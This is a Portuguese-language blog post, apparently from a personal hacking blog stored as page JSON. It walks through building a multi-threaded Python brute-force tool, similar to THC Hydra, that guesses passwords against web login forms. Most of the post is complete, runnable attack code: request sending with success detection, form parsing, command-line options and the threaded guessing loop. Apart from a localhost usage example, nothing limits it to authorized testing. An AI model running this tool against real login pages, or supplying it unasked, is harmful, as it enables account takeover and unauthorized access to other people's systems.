{"pageProps":{"frontmatter":{"title":"Criando nosso próprio script de Brute Force","date":"October 10 2020","category":"hacking","author":"ReddyyZ","lang":"pt-BR","tags":["brute force","login page","python","password cracking"],"reading_time":"8 minutes","excerpt":"Neste artigo vamos aprender como criar um script de brute force multi-threadead, semelhante ao THC Hydra.","cover_image":"https://reddyyz.github.io/images/posts/brute-force-post.png","private":false},"slug":"criando-nosso-proprio-script-de-brute-force","content":"\r\nNeste artigo vamos aprender como criar um script de brute force multi-threadead, semelhante ao THC Hydra.\r\n\r\n### Bibliotecas usadas\r\n\r\n- requests\r\n- argparse\r\n- threading\r\n- os\r\n- time\r\n\r\nVamos usar a biblioteca [requests](https://requests.readthedocs.io/en/master/) para facilitar o nosso trabalho com as requisições HTTP, [argparse](https://docs.python.org/3/howto/argparse.html) para utilizarmos argumentos na linha de comando e [threading]() para usarmos vários threads que proporcionarão uma maior velocidade.\r\n\r\nCaso não queira depender de bibliotecas, pode fazer todas as requisições na mão usando sockets.\r\n\r\n### Como irá funcionar o script\r\n\r\nO script receberá como argumento o usuário que deve ser testado, uma wordlist com as possíveis senhas e a mensagem de erro que é exibida quando se erra o login.\r\n\r\nEle percorrerá essa lista de senhas testando cada uma, e checando se a mensagem de erro é exibida, caso a mensagem de erro não apareça, a senha foi encontrada!\r\n\r\n### Multi-Threading\r\n\r\nO multi-threading funcionará da seguinte forma:\r\n\r\n> Neste exemplo vamos supor que a quantidade de threads definida é 16\r\n\r\nNo script terá um `for i in range(16)` que irá obter a primeira senha da lista, removê-la, criar um thread para essa requisição e adicioná-lo a uma lista de threads.\r\n\r\nEm seguida ele irá aguardar esses 16 threads terminarem e então repetirá este mesmo código com outras 16 senhas, até achar a senha correta ou terminar a wordlist.\r\n\r\n### Criando o script\r\n\r\nAgora que já entendemos como o script funcionará, vamos codar!\r\n\r\nPrimeiro importamos as bibliotecas:\r\n```python\r\nimport requests, argparse, threading, os, time\r\n```\r\n\r\n---\r\n\r\nE agora vamos criar a função que irá enviar a requisição\r\n\r\n```python\r\ndef send_request(url, data, login, error_message, t_number):\r\n    '''\r\n    error_message = Mensagem de login errado\r\n    data = Formulario preenchido\r\n    login = Usuario e senha\r\n    t_number = Numero do thread\r\n    '''\r\n    print(f\"[Thread: {t_number}] Testing: {login[0]}:{login[1]}\")\r\n    r = requests.post(url,data=data,timeout=3)\r\n\r\n    if not error_message in r.text:\r\n       print(f\"\\nSENHA ENCONTRADA: {login[0]}:{login[1]}\\n\")\r\n       os._exit(1)\r\n```\r\n\r\nAqui enviamos a requisição POST e aguardamos a resposta:\r\n```python\r\nr = requests.post(url,data=data,timeout=3)\r\n```\r\nE em seguida checamos se é exibida a mensagem de erro:\r\n```python\r\nif not error_message in r.text:\r\n```\r\nCaso não seja exibida, exibimos a senha encontrada e damos um \"exit\" no script.\r\n```python\r\nprint(f\"\\nSENHA ENCONTRADA: {login[0]}:{login[1]}\\n\")\r\nos._exit(1)\r\n```\r\n\r\n---\r\n\r\nAgora vamos criar a função que irá separar e nos retornar os dados que passarmos (formulários e a mensagem de erro).\r\n\r\n```python\r\ndef parse_info(data):\r\n    '''\r\n    data = \"usuario=^USER^&senha=^PASS^:Username or password invalid\"\r\n    '''\r\n\r\n    forms, mensagem_de_erro = data.split(\":\")\r\n    forms = forms.split(\"&\")\r\n    \r\n    user_form = \"\".join(i.replace(\"=^USER^\",\"\") for i in forms if \"^USER^\" in i)\r\n    pass_form = \"\".join(i.replace(\"=^PASS^\",\"\") for i in forms if \"^PASS^\" in i)\r\n\r\n    return (user_form, pass_form, mensagem_de_erro)\r\n```\r\n\r\nA função separa a mensagem de erro dos formulários, depois percorre os formulários procurando onde deve-se inserir o usuário e senha, e então retorna os dados.\r\n\r\n---\r\n\r\nE agora a função que irá receber os argumentos do usuário usando o argparse\r\n\r\n```python\r\ndef arguments():\r\n    parser = argparse.ArgumentParser(\"Brute Force\",description=\"https://reddyyz.github.io\",usage='python3 bruteforce.py -u http://localhost/login.php -i \"user=^USER^&pass=^PASS^:Username or password invalid\"')\r\n\r\n    parser.add_argument(\"-u\",\"--url\",help=\"URL do Alvo\")\r\n    parser.add_argument(\"-t\",\"--threads\",help=\"Número de threads\",default=16,type=int)\r\n    parser.add_argument(\"-i\",\"--info\",help=\"Fomularios para atacar e mensagem de erro\")\r\n\r\n    parser.add_argument(\"-uL\",\"--user\",help=\"Usuário\")\r\n\r\n    parser.add_argument(\"-P\",\"--pass-wordlist\",help=\"Wordlist para senhas\")\r\n\r\n    args = parser.parse_args()\r\n    if not args.url:\r\n        exit(parser.print_help())\r\n\r\n    if not args.user:\r\n        exit(parser.print_help())\r\n    if not args.pass_wordlist:\r\n        exit(parser.print_help())\r\n\r\n    return (args.url, args.threads, args.info, args.user, args.pass_wordlist)\r\n```\r\n\r\n---\r\n\r\nAgora com tudo pronto, vamos criar a função principal:\r\n\r\n```python\r\ndef main():\r\n    url, threads, info, user, pass_wordlist = arguments()\r\n    user_form, pass_form, mensagem_de_erro = parse_info(info)\r\n    # print(\"Iniciando...\\n\")\r\n    print(\\\r\nf\"\"\"\r\nAlvo: {url}\r\nThreads: {threads}\r\nMensagem de Erro: {mensagem_de_erro}\r\nFormulários:\r\n    USER -> {user_form}\r\n    PASS -> {pass_form}\r\n\"\"\")\r\n\r\n    time.sleep(2)\r\n\r\n    fd = open(pass_wordlist,\"r\")\r\n    passwords = fd.read().split(\"\\n\") # Lê as senhas\r\n    fd.close()\r\n\r\n    while True:\r\n        if not passwords: break # Encerra o script caso as senhas tenham acabado\r\n        threads_ = [None] * threads\r\n\r\n        for i in range(threads):\r\n            try:\r\n                passwd = passwords[0]\r\n                passwords.remove(passwd)\r\n            except IndexError:\r\n                break\r\n\r\n            login = [user, passwd]\r\n            data = {\r\n                user_form: user,\r\n                pass_form: passwd\r\n            }\r\n\r\n            threads_[i] = threading.Thread(target=send_request, args=(url, data, login, mensagem_de_erro, i))\r\n            threads_[i].start()\r\n\r\n        for thread in threads_:\r\n            try:\r\n                thread.join()\r\n            except:\r\n                pass\r\n\r\n    print(\"Ataque encerrado!\")\r\n```\r\n\r\n---\r\n\r\nAqui lemos as senhas, e criamos uma sequência de threads para a função \"send_request\", aguardamos os threads encerrarem, e repetimos até a senha ser encontrada.\r\n\r\n```python\r\nwhile True:\r\n        if not passwords: break # Encerra o script caso as senhas tenham acabado\r\n        threads_ = [None] * threads\r\n\r\n        for i in range(threads):\r\n            try:\r\n                passwd = passwords[0]\r\n                passwords.remove(passwd)\r\n            except IndexError:\r\n                break\r\n\r\n            login = [user, passwd]\r\n            data = {\r\n                user_form: user,\r\n                pass_form: passwd\r\n            }\r\n\r\n            threads_[i] = threading.Thread(target=send_request, args=(url, data, login, mensagem_de_erro, i))\r\n            threads_[i].start()\r\n\r\n        for thread in threads_:\r\n            try:\r\n                thread.join()\r\n            except:\r\n                pass\r\n```\r\n\r\nE por fim, colocamos a execução da função main dentro do `if __name__ == \"__main__\":`\r\n\r\n```python\r\nif __name__ == \"__main__\":\r\n    main()\r\n```\r\n\r\nE nosso script está pronto! [Código completo](https://gist.github.com/ReddyyZ/992e9545d2b3057d8fdc7896e51f3c71)\r\n\r\nDemonstração:\r\n\r\n<script id=\"asciicast-365627\" src=\"https://asciinema.org/a/365627.js\" async></script>\r\n\r\n---\r\n\r\n### Obrigado!\r\n\r\nObrigado por ler até aqui! Caso tenha alguma dúvida entre no meu servidor do discord e pergunte!<br>\r\n[Discord Server](https://discord.gg/v5d3PZ9)","categories":{"hacking":4,"criptografia":2,"web":0}},"__N_SSG":true}